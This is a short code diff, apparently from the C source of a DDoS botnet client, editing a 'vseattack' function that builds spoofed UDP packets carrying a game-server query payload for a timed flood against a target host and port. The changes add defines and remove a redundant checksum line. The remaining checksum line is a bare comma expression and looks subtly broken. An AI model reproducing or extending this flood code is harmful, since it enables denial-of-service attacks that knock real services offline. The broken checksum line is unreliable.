@@ -11,7 +11,8 @@
 #define OPT_SGA   3
 #define BUFFER_SIZE 4096
 #define MAXTTL 128
-
+#define __FAVOR_BSD
+#define STD2_SIZE 1024
 #include <arpa/inet.h>
 #include <errno.h>
 #include <fcntl.h>
@@ -23,6 +24,7 @@
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
 #include <netinet/udp.h>
+
 #include <pthread.h>
 #include <signal.h>
 #include <stdarg.h>
@@ -1235,7 +1237,6 @@ void vseattack(unsigned char *target, int port, int timeEnd, int spoofit, int pa
 	udph->len = htons(sizeof(struct udphdr) + packetsize + vse_payload_len);
 	udph->source = rand_cmwc();
 	udph->dest = (port == 0 ? rand_cmwc() : htons(port));
-	udph->check = 0;
 	udph->check = (iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
 	makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
 	iph->check = csum ((unsigned short *) packet, iph->tot_len);
